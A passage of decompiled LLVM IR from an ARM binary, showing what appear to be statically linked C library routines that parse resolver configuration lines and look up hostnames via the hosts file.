  store i32 %v3_15bfc, i32* %stack_var_-28, align 4
  %v6_15bfc = load i32, i32* @r5, align 4
  %v9_15bfc = load i32, i32* @r6, align 4
  %v12_15bfc = load i32, i32* @r7, align 4
  %v15_15bfc = load i32, i32* @r8, align 4
  %v18_15bfc = load i32, i32* @sl, align 4
  %v2_15c00 = ptrtoint i32* %stack_var_-192 to i32
  %v2_15c04 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_15c04, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_234f4.430 to i32), i32* %r2.global-to-local, align 4
  %v1_15c18 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_234f4.430 to i32), i32* %r0.global-to-local, align 4
  store i32 89132, i32* @lr, align 4
  %v1_15c28 = call i32 @__pthread_return_0()
  store i32 %v1_15c28, i32* %r0.global-to-local, align 4
  %v2_15c30 = load i32, i32* @global_var_29870.435, align 4
  %v5_15c38 = icmp sgt i32 %v2_15c30, 0
  br i1 %v5_15c38, label %dec_label_pc_15e74, label %dec_label_pc_15c3c

dec_label_pc_15c3c:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1aeb8.612 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1aecc.614 to i32), i32* @r1, align 4
  %v3_15c44 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1aeb8.612 to i32), i32 ptrtoint (i32* @global_var_1aecc.614 to i32))
  store i32 %v3_15c44, i32* %r0.global-to-local, align 4
  store i32 %v3_15c44, i32* @sl, align 4
  %v2_15c48 = icmp eq i32 %v3_15c44, 0
  br i1 %v2_15c48, label %dec_label_pc_15c50, label %dec_label_pc_15e3c.preheader

dec_label_pc_15c50:                               ; preds = %dec_label_pc_15c3c
  store i32 ptrtoint ([24 x i8]* @global_var_1aed0.616 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1aecc.614 to i32), i32* @r1, align 4
  %v3_15c58 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1aed0.616 to i32), i32 ptrtoint (i32* @global_var_1aecc.614 to i32))
  store i32 %v3_15c58, i32* %r0.global-to-local, align 4
  store i32 %v3_15c58, i32* @sl, align 4
  %v2_15c5c = icmp eq i32 %v3_15c58, 0
  br i1 %v2_15c5c, label %dec_label_pc_15e68, label %dec_label_pc_15e3c.preheader

dec_label_pc_15e3c.preheader:                     ; preds = %dec_label_pc_15c3c, %dec_label_pc_15c50
  %v0_15e4426 = phi i32 [ %v3_15c44, %dec_label_pc_15c3c ], [ %v3_15c58, %dec_label_pc_15c50 ]
  %v2_15cb0 = ptrtoint i32* %stack_var_-28 to i32
  %v3_15d4c = inttoptr i32 %tmp to i8*
  store i32 %v2_15c00, i32* %r0.global-to-local, align 4
  store i32 %v0_15e4426, i32* %r2.global-to-local, align 4
  %v3_15e4866 = call i32 @fgets(i32 %v2_15c00, i32 128, i32 %v0_15e4426)
  store i32 %v3_15e4866, i32* %r0.global-to-local, align 4
  %v2_15e4c68 = icmp eq i32 %v3_15e4866, 0
  store i32 %v2_15c00, i32* @r4, align 4
  br i1 %v2_15e4c68, label %dec_label_pc_15e5c, label %dec_label_pc_15c6c.preheader.lr.ph

dec_label_pc_15c6c.preheader.lr.ph:               ; preds = %dec_label_pc_15e3c.preheader
  %v1_15c6c11 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_15c6c.preheader

dec_label_pc_15c68:                               ; preds = %dec_label_pc_15c78
  %v1_15c68 = add i32 %v0_15c68, 1
  store i32 %v1_15c68, i32* %r0.global-to-local, align 4
  %v1_15c6c = inttoptr i32 %v1_15c68 to i8*
  %v2_15c6c = load i8, i8* %v1_15c6c, align 1
  %v3_15c6c = zext i8 %v2_15c6c to i32
  store i32 %v3_15c6c, i32* %r2.global-to-local, align 4
  %v2_15c70 = icmp eq i8 %v2_15c6c, 0
  br i1 %v2_15c70, label %dec_label_pc_15c8c, label %dec_label_pc_15c78

dec_label_pc_15c78:                               ; preds = %dec_label_pc_15c78.lr.ph, %dec_label_pc_15c68
  %v0_15c68 = phi i32 [ %v2_15c00, %dec_label_pc_15c78.lr.ph ], [ %v1_15c68, %dec_label_pc_15c68 ]
  %v1_15c80 = phi i32 [ %v3_15c6c13, %dec_label_pc_15c78.lr.ph ], [ %v3_15c6c, %dec_label_pc_15c68 ]
  %v3_15c80 = mul nuw nsw i32 %v1_15c80, 2
  %v4_15c80 = add i32 %v3_15c80, %v2_15c7c.pre
  %v5_15c80 = inttoptr i32 %v4_15c80 to i8*
  %v6_15c80 = load i8, i8* %v5_15c80, align 1
  %v1_15c84 = and i8 %v6_15c80, 32
  %v2_15c84 = icmp eq i8 %v1_15c84, 0
  br i1 %v2_15c84, label %dec_label_pc_15c8c, label %dec_label_pc_15c68

dec_label_pc_15c8c:                               ; preds = %dec_label_pc_15c68, %dec_label_pc_15c78, %dec_label_pc_15c6c.preheader
  %v0_15d2435 = phi i32 [ %v2_15c00, %dec_label_pc_15c6c.preheader ], [ %v1_15c68, %dec_label_pc_15c68 ], [ %v0_15c68, %dec_label_pc_15c78 ]
  %v0_15ca0 = phi i32 [ %v3_15c6c13, %dec_label_pc_15c6c.preheader ], [ %v3_15c6c, %dec_label_pc_15c68 ], [ %v1_15c80, %dec_label_pc_15c78 ]
  %v7_15c8c = icmp eq i32 %v0_15ca0, 10
  br i1 %v7_15c8c, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_15c8c
  %v3_15c90 = icmp eq i32 %v0_15ca0, 0
  br i1 %v3_15c90, label %bb55, label %dec_label_pc_15ca0

.thread3:                                         ; preds = %dec_label_pc_15c8c
  br label %dec_label_pc_15e3c.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_15e3c.backedge

dec_label_pc_15e3c.backedge:                      ; preds = %dec_label_pc_15e18, %dec_label_pc_15e30, %bb55, %dec_label_pc_15db0, %.thread3, %dec_label_pc_15ca0
  %v0_15e44.pre = load i32, i32* @sl, align 4
  store i32 %v2_15c00, i32* %r0.global-to-local, align 4
  store i32 %v0_15e44.pre, i32* %r2.global-to-local, align 4
  %v3_15e48 = call i32 @fgets(i32 %v2_15c00, i32 128, i32 %v0_15e44.pre)
  store i32 %v3_15e48, i32* %r0.global-to-local, align 4
  %v2_15e4c = icmp eq i32 %v3_15e48, 0
  store i32 %v2_15c00, i32* @r4, align 4
  br i1 %v2_15e4c, label %dec_label_pc_15e5c, label %dec_label_pc_15c6c.preheader

dec_label_pc_15ca0:                               ; preds = %bb
  %v7_15ca0 = icmp eq i32 %v0_15ca0, 35
  br i1 %v7_15ca0, label %dec_label_pc_15e3c.backedge, label %dec_label_pc_15d24

dec_label_pc_15cb0:                               ; preds = %bb58
  store i32 %v2_15cb0, i32* %r2.global-to-local, align 4
  %v4_15cb4 = mul i32 %storemerge, 4
  %v5_15cb4 = add i32 %v4_15cb4, %v2_15cb0
  %v2_15cb8 = add i32 %v5_15cb4, -36
  %v3_15cb8 = inttoptr i32 %v2_15cb8 to i32*
  store i32 %v0_15cb8, i32* %v3_15cb8, align 4
  %v0_15cc415 = load i32, i32* %r0.global-to-local, align 4
  %v1_15cc416 = inttoptr i32 %v0_15cc415 to i8*
  %v2_15cc417 = load i8, i8* %v1_15cc416, align 1
  %v3_15cc418 = zext i8 %v2_15cc417 to i32
  store i32 %v3_15cc418, i32* %r2.global-to-local, align 4
  %v2_15cc819 = icmp eq i8 %v2_15cc417, 0
  br i1 %v2_15cc819, label %dec_label_pc_15cf8.preheader, label %dec_label_pc_15cd0.lr.ph

dec_label_pc_15cd0.lr.ph:                         ; preds = %dec_label_pc_15cb0
  %v2_15cd4.pre = load i32, i32* @global_var_231b0, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15ce4
  %v1_15cc0 = add i32 %v0_15cc0, 1
  store i32 %v1_15cc0, i32* %r0.global-to-local, align 4
  %v1_15cc4 = inttoptr i32 %v1_15cc0 to i8*
  %v2_15cc4 = load i8, i8* %v1_15cc4, align 1
  %v3_15cc4 = zext i8 %v2_15cc4 to i32
  store i32 %v3_15cc4, i32* %r2.global-to-local, align 4
  %v2_15cc8 = icmp eq i8 %v2_15cc4, 0
  br i1 %v2_15cc8, label %dec_label_pc_15cf8.preheader, label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15cd0.lr.ph, %dec_label_pc_15cc0
  %v0_15cc0 = phi i32 [ %v0_15cc415, %dec_label_pc_15cd0.lr.ph ], [ %v1_15cc0, %dec_label_pc_15cc0 ]
  %v0_15ce4 = phi i32 [ %v3_15cc418, %dec_label_pc_15cd0.lr.ph ], [ %v3_15cc4, %dec_label_pc_15cc0 ]
  %v3_15cd8 = mul nuw nsw i32 %v0_15ce4, 2
  %v4_15cd8 = add i32 %v3_15cd8, %v2_15cd4.pre
  %v5_15cd8 = inttoptr i32 %v4_15cd8 to i8*
  %v6_15cd8 = load i8, i8* %v5_15cd8, align 1
  %v1_15cdc = and i8 %v6_15cd8, 32
  %v2_15cdc = icmp eq i8 %v1_15cdc, 0
  br i1 %v2_15cdc, label %dec_label_pc_15ce4, label %dec_label_pc_15cf8.preheader

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cd0
  %v7_15ce4 = icmp eq i32 %v0_15ce4, 10
  br i1 %v7_15ce4, label %dec_label_pc_15cf8.preheader, label %dec_label_pc_15cc0

dec_label_pc_15cf8.preheader:                     ; preds = %dec_label_pc_15ce4, %dec_label_pc_15cd0, %dec_label_pc_15cc0, %dec_label_pc_15cb0
  %v0_15cf820 = phi i32 [ %v0_15cc415, %dec_label_pc_15cb0 ], [ %v0_15cc0, %dec_label_pc_15ce4 ], [ %v0_15cc0, %dec_label_pc_15cd0 ], [ %v1_15cc0, %dec_label_pc_15cc0 ]
  %v1_15cf821 = inttoptr i32 %v0_15cf820 to i8*
  %v2_15cf822 = load i8, i8* %v1_15cf821, align 1
  %v3_15cf823 = zext i8 %v2_15cf822 to i32
  store i32 %v3_15cf823, i32* %r2.global-to-local, align 4
  %v2_15cfc24 = icmp eq i8 %v2_15cf822, 0
  br i1 %v2_15cfc24, label %dec_label_pc_15d20, label %dec_label_pc_15d04

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15d04, %dec_label_pc_15d18
  %v3_15cf4 = inttoptr i32 %v2_15cf4 to i8*
  store i8 0, i8* %v3_15cf4, align 1
  %v4_15cf4 = load i32, i32* %r0.global-to-local, align 4
  %v5_15cf4 = add i32 %v4_15cf4, 1
  store i32 %v5_15cf4, i32* %r0.global-to-local, align 4
  %v1_15cf8 = inttoptr i32 %v5_15cf4 to i8*
  %v2_15cf8 = load i8, i8* %v1_15cf8, align 1
  %v3_15cf8 = zext i8 %v2_15cf8 to i32
  store i32 %v3_15cf8, i32* %r2.global-to-local, align 4
  %v2_15cfc = icmp eq i8 %v2_15cf8, 0
  br i1 %v2_15cfc, label %dec_label_pc_15d20, label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15cf8.preheader, %dec_label_pc_15cf0
  %v0_15d18 = phi i32 [ %v3_15cf8, %dec_label_pc_15cf0 ], [ %v3_15cf823, %dec_label_pc_15cf8.preheader ]
  %v2_15cf4 = phi i32 [ %v5_15cf4, %dec_label_pc_15cf0 ], [ %v0_15cf820, %dec_label_pc_15cf8.preheader ]
  %v2_15d08 = load i32, i32* @global_var_231b0, align 4
  %v3_15d0c = mul nuw nsw i32 %v0_15d18, 2
  %v4_15d0c = add i32 %v2_15d08, %v3_15d0c
  %v5_15d0c = inttoptr i32 %v4_15d0c to i8*
  %v6_15d0c = load i8, i8* %v5_15d0c, align 1
  %v1_15d10 = and i8 %v6_15d0c, 32
  %v2_15d10 = icmp eq i8 %v1_15d10, 0
  br i1 %v2_15d10, label %dec_label_pc_15d18, label %dec_label_pc_15cf0

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15d04
  %v7_15d18 = icmp eq i32 %v0_15d18, 10
  br i1 %v7_15d18, label %dec_label_pc_15cf0, label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15cf0, %dec_label_pc_15d18, %dec_label_pc_15cf8.preheader
  %v0_15d2434 = phi i32 [ %v0_15cf820, %dec_label_pc_15cf8.preheader ], [ %v5_15cf4, %dec_label_pc_15cf0 ], [ %v2_15cf4, %dec_label_pc_15d18 ]
  %v0_15d20 = load i32, i32* @r8, align 4
  %v1_15d20 = add i32 %v0_15d20, 1
  br label %dec_label_pc_15d24

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15ca0, %dec_label_pc_15d20
  %storemerge = phi i32 [ %v1_15d20, %dec_label_pc_15d20 ], [ 0, %dec_label_pc_15ca0 ]
  %v0_15cb8 = phi i32 [ %v0_15d2434, %dec_label_pc_15d20 ], [ %v0_15d2435, %dec_label_pc_15ca0 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_15d24 = inttoptr i32 %v0_15cb8 to i8*
  %v2_15d24 = load i8, i8* %v1_15d24, align 1
  %v3_15d24 = zext i8 %v2_15d24 to i32
  %v2_15d28 = icmp eq i8 %v2_15d24, 0
  br i1 %v2_15d28, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_15d24
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_15d24, %bb56
  %v0_15d38.pr = phi i32 [ %v3_15d24, %dec_label_pc_15d24 ], [ 1, %bb56 ]
  %v1_15d30 = add i32 %storemerge, -4
  %v3_15d30 = sub i32 3, %storemerge
  %v4_15d30 = and i32 %v3_15d30, %storemerge
  %v5_15d30 = icmp slt i32 %v4_15d30, 0
  %v6_15d30 = icmp slt i32 %v1_15d30, 0
  %v7_15d30 = icmp eq i32 %storemerge, 4
  %v3_15d34 = xor i1 %v6_15d30, %v5_15d30
  %v4_15d34 = or i1 %v7_15d30, %v3_15d34
  br i1 %v4_15d34, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_15d40

bb58:                                             ; preds = %bb57
  %v2_15d38 = icmp eq i32 %v0_15d38.pr, 0
  br i1 %v2_15d38, label %dec_label_pc_15d40, label %dec_label_pc_15cb0

dec_label_pc_15d40:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1aee8.619 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_15d4c = call i32 @__GI_strcoll(i8* %v3_15d4c, i32 ptrtoint ([11 x i8]* @global_var_1aee8.619 to i32))
  store i32 %v4_15d4c, i32* %r0.global-to-local, align 4
  %v2_15d50 = icmp eq i32 %v4_15d4c, 0
  br i1 %v2_15d50, label %dec_label_pc_15d78.preheader, label %dec_label_pc_15d9c

dec_label_pc_15d78.preheader:                     ; preds = %dec_label_pc_15d40
  br label %dec_label_pc_15d78

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d90
  %v1_15d60 = add i32 %v5_15d80, -36
  %v2_15d60 = inttoptr i32 %v1_15d60 to i32*
  %v3_15d60 = load i32, i32* %v2_15d60, align 4
  store i32 %v3_15d60, i32* %r0.global-to-local, align 4
  %v1_15d64 = inttoptr i32 %v3_15d60 to i8*
  %v2_15d64 = call i32 @__GI_strdup(i8* %v1_15d64)
  store i32 %v2_15d64, i32* %r0.global-to-local, align 4
  %v0_15d6c = load i32, i32* @r4, align 4
  %v1_15d6c = add i32 %v0_15d6c, 1
  store i32 %v1_15d6c, i32* %r2.global-to-local, align 4
  %v5_15d70 = mul i32 %v0_15d6c, 4
  %v6_15d70 = add i32 %v5_15d70, ptrtoint (i32* @global_var_29864.438 to i32)
  %v7_15d70 = inttoptr i32 %v6_15d70 to i32*
  store i32 %v2_15d64, i32* %v7_15d70, align 4
  %v0_15d74 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d74 = load i32, i32* @r7, align 4
  %v2_15d74 = inttoptr i32 %v1_15d74 to i32*
  store i32 %v0_15d74, i32* %v2_15d74, align 4
  %v0_15d7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15d78

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d78.preheader, %dec_label_pc_15d60
  %v0_15d88 = phi i32 [ 1, %dec_label_pc_15d78.preheader ], [ %v0_15d7c.pre, %dec_label_pc_15d60 ]
  store i32 %v2_15cb0, i32* %r2.global-to-local, align 4
  %v1_15d7c = load i32, i32* @r8, align 4
  %v2_15d7c = sub i32 %v0_15d88, %v1_15d7c
  %v4_15d7c = xor i32 %v1_15d7c, %v0_15d88
  %v5_15d7c = xor i32 %v2_15d7c, %v0_15d88
  %v6_15d7c = and i32 %v5_15d7c, %v4_15d7c
  %v7_15d7c = icmp slt i32 %v6_15d7c, 0
  %v8_15d7c = icmp slt i32 %v2_15d7c, 0
  %v4_15d80 = mul i32 %v0_15d88, 4
  %v5_15d80 = add i32 %v4_15d80, %v2_15cb0
  store i32 ptrtoint (i32* @global_var_29870.435 to i32), i32* @r7, align 4
  %v1_15d88 = add i32 %v0_15d88, 1
  store i32 %v1_15d88, i32* @r5, align 4
  %v2_15d8c = xor i1 %v8_15d7c, %v7_15d7c
  br i1 %v2_15d8c, label %dec_label_pc_15d90, label %dec_label_pc_15d9c

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d78
  %v2_15d90 = load i32, i32* @global_var_29870.435, align 4
  store i32 %v2_15d90, i32* @r4, align 4
  %v7_15d98 = icmp slt i32 %v2_15d90, 3
  br i1 %v7_15d98, label %dec_label_pc_15d60, label %dec_label_pc_15d9c

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d78, %dec_label_pc_15d90, %dec_label_pc_15d40
  %v0_15d9c = load i32, i32* @r6, align 4
  store i32 %v0_15d9c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1aef4.622 to i32), i32* @r1, align 4
  %v3_15da4 = inttoptr i32 %v0_15d9c to i8*
  %v4_15da4 = call i32 @__GI_strcoll(i8* %v3_15da4, i32 ptrtoint ([7 x i8]* @global_var_1aef4.622 to i32))
  store i32 %v4_15da4, i32* %r0.global-to-local, align 4
  %v2_15da8 = icmp eq i32 %v4_15da4, 0
  br i1 %v2_15da8, label %dec_label_pc_15de0.preheader, label %dec_label_pc_15db0

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15d9c
  %v0_15db0 = load i32, i32* @r6, align 4
  store i32 %v0_15db0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1aefc.624 to i32), i32* @r1, align 4
  %v3_15db8 = inttoptr i32 %v0_15db0 to i8*
  %v4_15db8 = call i32 @__GI_strcoll(i8* %v3_15db8, i32 ptrtoint ([7 x i8]* @global_var_1aefc.624 to i32))
  store i32 %v4_15db8, i32* %r0.global-to-local, align 4
  %v2_15dbc = icmp eq i32 %v4_15db8, 0
  br i1 %v2_15dbc, label %dec_label_pc_15de0.preheader, label %dec_label_pc_15e3c.backedge

dec_label_pc_15de0.preheader:                     ; preds = %dec_label_pc_15d9c, %dec_label_pc_15db0
  store i32 ptrtoint (i32* @global_var_29874.599 to i32), i32* @r4, align 4
  %v2_15de460 = load i32, i32* @global_var_29874.599, align 4
  store i32 ptrtoint (i32* @global_var_29854.603 to i32), i32* @r5, align 4
  %v1_15df063 = add i32 %v2_15de460, -1
  store i32 %v1_15df063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_15de460, 1
  br i1 %tmp5964, label %dec_label_pc_15df8, label %dec_label_pc_15dc8

dec_label_pc_15dc8:                               ; preds = %dec_label_pc_15de0.preheader, %dec_label_pc_15dc8
  %v1_15df065 = phi i32 [ %v1_15df0, %dec_label_pc_15dc8 ], [ %v1_15df063, %dec_label_pc_15de0.preheader ]
  %v4_15dc8 = mul i32 %v1_15df065, 4
  %v5_15dc8 = add i32 %v4_15dc8, ptrtoint (i32* @global_var_29854.603 to i32)
  %v6_15dc8 = inttoptr i32 %v5_15dc8 to i32*
  %v7_15dc8 = load i32, i32* %v6_15dc8, align 4
  store i32 %v7_15dc8, i32* @r0, align 4
  store i32 %v1_15df065, i32* @global_var_29874.599, align 4
  %v0_15dd0 = call i32 @free()
  store i32 %v0_15dd0, i32* %r0.global-to-local, align 4
  %v0_15dd4 = load i32, i32* @r4, align 4
  %v1_15dd4 = inttoptr i32 %v0_15dd4 to i32*
  %v2_15dd4 = load i32, i32* %v1_15dd4, align 4
  %v1_15ddc = load i32, i32* @r5, align 4
  %v5_15ddc = mul i32 %v2_15dd4, 4
  %v6_15ddc = add i32 %v1_15ddc, %v5_15ddc
  %v7_15ddc = inttoptr i32 %v6_15ddc to i32*
  store i32 0, i32* %v7_15ddc, align 4
  store i32 ptrtoint (i32* @global_var_29874.599 to i32), i32* @r4, align 4
  %v2_15de4 = load i32, i32* @global_var_29874.599, align 4
  store i32 ptrtoint (i32* @global_var_29854.603 to i32), i32* @r5, align 4
  %v1_15df0 = add i32 %v2_15de4, -1
  store i32 %v1_15df0, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_15de4, 1
  br i1 %tmp59, label %dec_label_pc_15df8, label %dec_label_pc_15dc8

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15dc8, %dec_label_pc_15de0.preheader
  br label %dec_label_pc_15e18

dec_label_pc_15e00:                               ; preds = %dec_label_pc_15e30
  %v1_15e00 = add i32 %v5_15e20, -36
  %v2_15e00 = inttoptr i32 %v1_15e00 to i32*
  %v3_15e00 = load i32, i32* %v2_15e00, align 4
  store i32 %v3_15e00, i32* %r0.global-to-local, align 4
  %v1_15e04 = inttoptr i32 %v3_15e00 to i8*
  %v2_15e04 = call i32 @__GI_strdup(i8* %v1_15e04)
  store i32 %v2_15e04, i32* %r0.global-to-local, align 4
  %v0_15e0c = load i32, i32* @r4, align 4
  %v1_15e0c = add i32 %v0_15e0c, 1
  store i32 %v1_15e0c, i32* %r2.global-to-local, align 4
  %v5_15e10 = mul i32 %v0_15e0c, 4
  %v6_15e10 = add i32 %v5_15e10, ptrtoint (i32* @global_var_29854.603 to i32)
  %v7_15e10 = inttoptr i32 %v6_15e10 to i32*
  store i32 %v2_15e04, i32* %v7_15e10, align 4
  %v0_15e14 = load i32, i32* %r2.global-to-local, align 4
  %v1_15e14 = load i32, i32* @r6, align 4
  %v2_15e14 = inttoptr i32 %v1_15e14 to i32*
  store i32 %v0_15e14, i32* %v2_15e14, align 4
  %v0_15e1c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15e18

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15df8, %dec_label_pc_15e00
  %v0_15e28 = phi i32 [ 1, %dec_label_pc_15df8 ], [ %v0_15e1c.pre, %dec_label_pc_15e00 ]
  store i32 %v2_15cb0, i32* %r2.global-to-local, align 4
  %v1_15e1c = load i32, i32* @r8, align 4
  %v2_15e1c = sub i32 %v0_15e28, %v1_15e1c
  %v4_15e1c = xor i32 %v1_15e1c, %v0_15e28
  %v5_15e1c = xor i32 %v2_15e1c, %v0_15e28
  %v6_15e1c = and i32 %v5_15e1c, %v4_15e1c
  %v7_15e1c = icmp slt i32 %v6_15e1c, 0
  %v8_15e1c = icmp slt i32 %v2_15e1c, 0
  %v4_15e20 = mul i32 %v0_15e28, 4
  %v5_15e20 = add i32 %v4_15e20, %v2_15cb0
  store i32 ptrtoint (i32* @global_var_29874.599 to i32), i32* @r6, align 4
  %v1_15e28 = add i32 %v0_15e28, 1
  store i32 %v1_15e28, i32* @r5, align 4
  %v2_15e2c = xor i1 %v8_15e1c, %v7_15e1c
  br i1 %v2_15e2c, label %dec_label_pc_15e30, label %dec_label_pc_15e3c.backedge

dec_label_pc_15e30:                               ; preds = %dec_label_pc_15e18
  %v2_15e30 = load i32, i32* @global_var_29874.599, align 4
  store i32 %v2_15e30, i32* @r4, align 4
  %v7_15e38 = icmp slt i32 %v2_15e30, 4
  br i1 %v7_15e38, label %dec_label_pc_15e00, label %dec_label_pc_15e3c.backedge

dec_label_pc_15c6c.preheader:                     ; preds = %dec_label_pc_15c6c.preheader.lr.ph, %dec_label_pc_15e3c.backedge
  store i32 %v2_15c00, i32* %r0.global-to-local, align 4
  %v2_15c6c12 = load i8, i8* %v1_15c6c11, align 4
  %v3_15c6c13 = zext i8 %v2_15c6c12 to i32
  store i32 %v3_15c6c13, i32* %r2.global-to-local, align 4
  %v2_15c7014 = icmp eq i8 %v2_15c6c12, 0
  br i1 %v2_15c7014, label %dec_label_pc_15c8c, label %dec_label_pc_15c78.lr.ph

dec_label_pc_15c78.lr.ph:                         ; preds = %dec_label_pc_15c6c.preheader
  %v2_15c7c.pre = load i32, i32* @global_var_231b0, align 4
  br label %dec_label_pc_15c78

dec_label_pc_15e5c:                               ; preds = %dec_label_pc_15e3c.backedge, %dec_label_pc_15e3c.preheader
  %v0_15e5c = load i32, i32* @sl, align 4
  store i32 %v0_15e5c, i32* %r0.global-to-local, align 4
  %v1_15e60 = inttoptr i32 %v0_15e5c to i8*
  %v2_15e60 = call i32 @__GI_fclose(i8* %v1_15e60)
  store i32 %v2_15e60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e74

dec_label_pc_15e68:                               ; preds = %dec_label_pc_15c50
  %v0_15e68 = call i32 @__GI___h_errno_location()
  store i32 %v0_15e68, i32* %r0.global-to-local, align 4
  %v2_15e70 = inttoptr i32 %v0_15e68 to i32*
  store i32 3, i32* %v2_15e70, align 4
  br label %dec_label_pc_15e74

dec_label_pc_15e74:                               ; preds = %entry, %dec_label_pc_15e5c, %dec_label_pc_15e68
  store i32 %v2_15c04, i32* @r0, align 4
  %v1_15e84 = call i32 @__pthread_return_void()
  store i32 %v1_15e84, i32* %r0.global-to-local, align 4
  store i32 %v6_15bfc, i32* @r5, align 4
  store i32 %v9_15bfc, i32* @r6, align 4
  store i32 %v12_15bfc, i32* @r7, align 4
  store i32 %v15_15bfc, i32* @r8, align 4
  store i32 %v18_15bfc, i32* @sl, align 4
  ret i32 %v1_15e84

; uselistorder directives
  uselistorder i32 %v3_15c6c13, { 2, 1, 0 }
  uselistorder i32 %v2_15e1c, { 1, 0 }
  uselistorder i32 %v0_15e28, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_15df0, { 1, 0 }
  uselistorder i32 %v1_15df065, { 1, 0 }
  uselistorder i32 %v2_15d7c, { 1, 0 }
  uselistorder i32 %v0_15d88, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15cb8, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_15cf820, { 1, 0, 2 }
  uselistorder i32 %v2_15cb0, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_15c00, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 13, 2, 0, 1, 3, 16, 6, 4, 5, 7, 15, 8, 14, 9, 11, 10, 17, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 19, 5, 4, 6, 8, 7, 10, 9, 12, 11, 20, 13, 14, 18, 15, 17, 22, 21, 16, 28, 27, 23, 26, 24, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 15, 13, 12, 11, 10, 9, 8, 20, 19, 7, 6, 5, 4, 3, 14, 18, 17, 16, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_29854.603 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_29874.599, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_29874.599 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_29864.438 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 6, 3, 4, 8, 9, 10, 11, 7, 12, 5, 13 }
  uselistorder i32* @global_var_29870.435, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_15e74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15c6c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15e18, { 1, 0 }
  uselistorder label %dec_label_pc_15dc8, { 1, 0 }
  uselistorder label %dec_label_pc_15de0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15d9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d78, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_15d24, { 1, 0 }
  uselistorder label %dec_label_pc_15d20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d04, { 1, 0 }
  uselistorder label %dec_label_pc_15cf0, { 1, 0 }
  uselistorder label %dec_label_pc_15cd0, { 1, 0 }
  uselistorder label %dec_label_pc_15e3c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_15c8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e3c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_15f0c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_15f0c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_15f18 = load i32, i32* @r4, align 4
